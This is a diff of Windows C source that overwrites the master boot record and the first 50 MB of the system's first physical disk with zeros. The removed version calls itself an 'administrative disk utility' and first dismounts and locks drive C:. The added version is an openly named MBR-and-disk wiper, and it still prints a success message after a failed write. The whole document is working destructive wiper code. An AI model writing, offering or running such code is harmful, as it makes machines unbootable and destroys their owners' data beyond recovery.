@@ -1,108 +1,84 @@
 #include <windows.h>
 #include <stdio.h>
-#include <winioctl.h>
 
-int main() {
-    DWORD bytesReturned = 0;
-    DWORD bytesWritten = 0;
+#define TARGET_DRIVE L"\\\\.\\PhysicalDrive0"
+#define MBR_SIZE 512 // Standard MBR size is 512 bytes (Sector 0)
+#define CHUNK_SIZE (1024 * 1024) // 1 MB chunks for efficient writing
+#define TOTAL_WIPE_SIZE (50LL * 1024LL * 1024LL) // Total 50 MB
 
-    printf("[+] Initializing administrative disk utility...\n");
-
-    // =========================================================================
-    // STEP 1: Handle the Logical Volume Layer (e.g., the partition)
-    // =========================================================================
-    HANDLE hVolume = CreateFileA(
-        "\\\\.\\C:",
-        GENERIC_READ | GENERIC_WRITE,
+int WipeMBRThen50MB() {
+    HANDLE hDrive = CreateFileW(
+        TARGET_DRIVE,
+        GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
         NULL,
         OPEN_EXISTING,
-        0,
-        NULL
-    );
-
-    if (hVolume == INVALID_HANDLE_VALUE) {
-        printf("[-] Failed to open volume handle. Error: %lu (Requires Elevation)\n", GetLastError());
-        return 1;
-    }
-    printf("[+] Obtained handle to logical volume C:\n");
-
-    BOOL isDismounted = DeviceIoControl(
-        hVolume,
-        FSCTL_DISMOUNT_VOLUME,
-        NULL, 0,
-        NULL, 0,
-        &bytesReturned,
-        NULL
-    );
-
-    if (!isDismounted) {
-        printf("[-] Volume dismount rejected by kernel. Error: %lu\n", GetLastError());
-        CloseHandle(hVolume);
-        return 1;
-    }
-    printf("[+] Logical file system driver dismounted successfully.\n");
-
-    BOOL isLocked = DeviceIoControl(
-        hVolume,
-        FSCTL_LOCK_VOLUME,
-        NULL, 0,
-        NULL, 0,
-        &bytesReturned,
-        NULL
-    );
-
-    if (!isLocked) {
-        printf("[-] Volume lock rejected by kernel. Error: %lu\n", GetLastError());
-        CloseHandle(hVolume);
-        return 1;
-    }
-    printf("[+] Volume lock acquired successfully.\n");
-
-    // =========================================================================
-    // STEP 2: Handle the Master Physical Storage Interface
-    // =========================================================================
-    HANDLE hDrive = CreateFileA(
-        "\\\\.\\PhysicalDrive0",
-        GENERIC_READ | GENERIC_WRITE,
-        FILE_SHARE_READ | FILE_SHARE_WRITE,
-        NULL,
-        OPEN_EXISTING,
-        0,
+        FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
         NULL
     );
 
     if (hDrive == INVALID_HANDLE_VALUE) {
-        printf("[-] Failed to open physical raw drive handle. Error: %lu\n", GetLastError());
-        CloseHandle(hVolume);
-        return 1;
-    }
-    printf("[+] Successfully obtained master handle to PhysicalDrive0.\n");
-
-    // =========================================================================
-    // STEP 3: Execution Context / MBR Overwrite
-    // =========================================================================
-    char sectorBuffer[512];
-    ZeroMemory(sectorBuffer, sizeof(sectorBuffer));
-
-    BOOL isWritten = WriteFile(
-        hDrive,
-        sectorBuffer,
-        sizeof(sectorBuffer),
-        &bytesWritten,
-        NULL
-    );
-
-    if (isWritten && bytesWritten == 512) {
-        printf("[+] Successfully overwrote the target physical sector with zeros (%lu bytes written).\n", bytesWritten);
-    } else {
-        printf("[-] Write failed or incomplete. Error: %lu\n", GetLastError());
+        printf("[-] Failed to open drive handle. Error: %lu (Requires Elevation)\n", GetLastError());
+        return 0;
     }
 
-    // Cleanup resources in reverse allocation order
+    // Allocate an aligned memory buffer for raw disk operations
+    LPVOID zeroBuffer = VirtualAlloc(NULL, CHUNK_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!zeroBuffer) {
+        printf("[-] Failed to allocate aligned buffer.\n");
+        CloseHandle(hDrive);
+        return 0;
+    }
+    ZeroMemory(zeroBuffer, CHUNK_SIZE);
+
+    LARGE_INTEGER pos;
+
+    // ==========================================
+    // STEP 1: Wipe the MBR (First 512 bytes)
+    // ==========================================
+    pos.QuadPart = 0;
+    if (!SetFilePointerEx(hDrive, pos, NULL, FILE_BEGIN)) {
+        printf("[-] Failed to set file pointer to MBR. Error: %lu\n", GetLastError());
+        VirtualFree(zeroBuffer, 0, MEM_RELEASE);
+        CloseHandle(hDrive);
+        return 0;
+    }
+
+    DWORD bytesWritten = 0;
+    // We can use the first 512 bytes of our zeroBuffer to clear the MBR
+    if (!WriteFile(hDrive, zeroBuffer, MBR_SIZE, &bytesWritten, NULL)) {
+        printf("[-] Failed to overwrite MBR. Error: %lu\n", GetLastError());
+        VirtualFree(zeroBuffer, 0, MEM_RELEASE);
+        CloseHandle(hDrive);
+        return 0;
+    }
+    printf("[+] Step 1 Complete: MBR (Sector 0) successfully wiped.\n");
+
+    // ==========================================
+    // STEP 2: Wipe the remaining area up to 50 MB
+    // ==========================================
+    printf("[+] Step 2 Starting: Wiping remaining data up to the 50 MB mark...\n");
+
+    LONGLONG totalBytesWritten = MBR_SIZE; // We already wrote 512 bytes
+
+    while (totalBytesWritten < TOTAL_WIPE_SIZE) {
+        DWORD bytesToWrite = CHUNK_SIZE;
+        if (totalBytesWritten + bytesToWrite > TOTAL_WIPE_SIZE) {
+            bytesToWrite = (DWORD)(TOTAL_WIPE_SIZE - totalBytesWritten);
+        }
+
+        if (!WriteFile(hDrive, zeroBuffer, bytesToWrite, &bytesWritten, NULL)) {
+            printf("[-] Write failed at offset %lld. Error: %lu\n", totalBytesWritten, GetLastError());
+            break;
+        }
+
+        totalBytesWritten += bytesWritten;
+        printf("[*] Progress: %lld MB / 50 MB written...\r", totalBytesWritten / (1024 * 1024));
+    }
+
+    printf("\n[+] Success: MBR and the first 50 MB have been wiped completely.\n");
+
+    VirtualFree(zeroBuffer, 0, MEM_RELEASE);
     CloseHandle(hDrive);
-    CloseHandle(hVolume);
-    printf("[+] Maintenance interfaces cleanly closed.\n");
-
-    return 0;
+    return 1;
 }
